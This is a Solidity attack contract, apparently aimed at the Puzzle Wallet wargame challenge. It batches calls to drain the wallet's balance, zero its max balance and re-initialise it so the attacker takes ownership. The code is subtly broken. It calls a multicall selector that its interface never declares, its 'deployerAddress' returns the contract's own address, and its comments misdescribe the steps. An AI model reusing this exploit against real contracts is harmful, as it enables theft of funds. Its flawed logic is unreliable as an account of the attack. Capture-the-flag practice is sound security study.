pragma solidity ^0.8.0;

interface PuzzleWallet {
    function execute(address to, uint256 value, bytes calldata data) external payable returns (bool);
    function setMaxBalance(uint256 _maxBalance) external;
    function init(uint256 _maxBalance) external;
}

contract PuzzleWalletAttack {
    address private immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() external {
        // Step 1: Transfer funds to deployer to drain contract balance
        bytes memory executeCall = abi.encodeWithSelector(
            PuzzleWallet.execute.selector,
            deployerAddress(),
            address(instance).balance,
            ""
        );

        // Step 2: Set max balance to zero (requires contract balance zero)
        bytes memory setMaxBalanceCall = abi.encodeWithSelector(
            PuzzleWallet.setMaxBalance.selector,
            0
        );

        // Step 3: Re-initialize contract to set owner to attacker
        bytes memory initCall = abi.encodeWithSelector(
            PuzzleWallet.init.selector,
            0
        );

        // Prepare data for multicall
        bytes[] memory data = new bytes[](3);
        data[0] = executeCall;
        data[1] = setMaxBalanceCall;
        data[2] = initCall;

        // Execute multicall as the attacker
        (bool success, ) = address(instance).call(
            abi.encodeWithSelector(
                PuzzleWallet.multicall.selector,
                data
            )
        );
        require(success, "Attack failed");
    }

    function deployerAddress() private view returns (address) {
        return address(this);
    }
}
